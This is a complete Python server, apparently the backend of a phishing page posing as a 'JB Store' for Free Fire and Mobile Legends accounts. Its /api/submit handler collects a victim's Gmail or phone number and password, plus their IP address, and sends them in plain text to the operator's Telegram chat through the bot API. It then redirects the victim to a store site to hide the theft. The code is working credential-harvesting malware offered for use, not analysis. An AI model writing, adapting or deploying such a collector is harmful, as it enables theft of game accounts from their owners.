#!/usr/bin/env python3
"""JB Store — Account Collector Server (Termux Friendly)"""

import json
import os
import re
import sys
import time
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

BASE_DIR   = Path(__file__).resolve().parent
STATIC_DIR = BASE_DIR / "static"

# --- load .env ---
env_file = BASE_DIR / ".env"
if env_file.exists():
    for raw in env_file.read_text().splitlines():
        line = raw.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        k, v = line.split("=", 1)
        os.environ.setdefault(k.strip(), v.strip())

BOT_TOKEN    = os.environ.get("BOT_TOKEN", "").strip()
OWNER_ID     = os.environ.get("OWNER_ID", "").strip()
WEBSTORE_URL = os.environ.get("WEBSTORE_URL", "https://example.com").strip()
PORT         = int(os.environ.get("PORT", "8080"))

EMAIL_RE = re.compile(r"^[^\s@]+@gmail\.com$", re.IGNORECASE)
PHONE_RE = re.compile(r"^08\d{8,12}$")


def validate_identity(v: str) -> bool:
    v = v.strip()
    if "@" in v:
        return bool(EMAIL_RE.match(v))
    return bool(PHONE_RE.match(v))


def send_telegram(text: str):
    if not BOT_TOKEN or not OWNER_ID:
        return False, "BOT_TOKEN / OWNER_ID belum diisi di .env"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = urllib.parse.urlencode({
        "chat_id": OWNER_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": "true",
    }).encode()
    try:
        req = urllib.request.Request(url, data=payload, method="POST")
        with urllib.request.urlopen(req, timeout=10) as r:
            body = json.loads(r.read().decode())
            if body.get("ok"):
                return True, ""
            return False, body.get("description", "telegram error")
    except Exception as e:
        return False, str(e)


class Handler(BaseHTTPRequestHandler):
    server_version = "JBStore/1.0"

    def log_message(self, fmt, *args):
        sys.stderr.write("[%s] %s\n" % (self.log_date_time_string(), fmt % args))

    def _send(self, code, body, content_type="application/json"):
        if isinstance(body, (dict, list)):
            body = json.dumps(body)
        if isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _serve_file(self, path: Path, content_type: str):
        if not path.exists():
            return self._send(404, {"ok": False, "error": "not found"})
        data = path.read_bytes()
        self.send_response(200)
        self.send_header("Content-Type", content_type + "; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        path = self.path.split("?", 1)[0]
        if path in ("/", "/index.html"):
            return self._serve_file(STATIC_DIR / "index.html", "text/html")
        return self._send(404, {"ok": False, "error": "not found"})

    def do_POST(self):
        if self.path.split("?", 1)[0] != "/api/submit":
            return self._send(404, {"ok": False, "error": "not found"})

        try:
            length = int(self.headers.get("Content-Length", "0"))
            raw    = self.rfile.read(length)
            data   = json.loads(raw.decode("utf-8"))
        except Exception:
            return self._send(400, {"ok": False, "error": "invalid request"})

        game     = str(data.get("game", "")).strip()
        identity = str(data.get("identity", "")).strip()
        password = str(data.get("password", ""))

        if game not in ("FreeFire", "MobileLegend"):
            return self._send(400, {"ok": False, "error": "stock tidak valid"})
        if not validate_identity(identity):
            return self._send(400, {"ok": False, "error": "format email/HP tidak valid"})
        if not password or len(password) < 3:
            return self._send(400, {"ok": False, "error": "password minimal 3 karakter"})

        ts = time.strftime("%Y-%m-%d %H:%M:%S")
        text = (
            "<b>🔔 JB Store — Akun Baru</b>\n"
            f"🎮 <b>Stock:</b> {game}\n"
            f"📧 <b>Email/HP:</b> <code>{identity}</code>\n"
            f"🔒 <b>Password:</b> <code>{password}</code>\n"
            f"🕒 <b>Waktu:</b> {ts}\n"
            f"🌐 <b>IP:</b> {self.client_address[0]}"
        )

        ok, err = send_telegram(text)
        if not ok:
            print(f"[WARN] Telegram gagal: {err}", file=sys.stderr)

        return self._send(200, {"ok": True, "redirect": WEBSTORE_URL})


def main():
    if not WEBSTORE_URL or WEBSTORE_URL == "https://example.com":
        print("[WARN] WEBSTORE_URL belum di-set di .env")
    if not BOT_TOKEN or not OWNER_ID:
        print("[WARN] BOT_TOKEN / OWNER_ID belum di-set di .env")

    srv = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)
    print(f"[+] Server jalan di http://0.0.0.0:{PORT}")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server dihentikan")
        srv.server_close()


if __name__ == "__main__":
    main()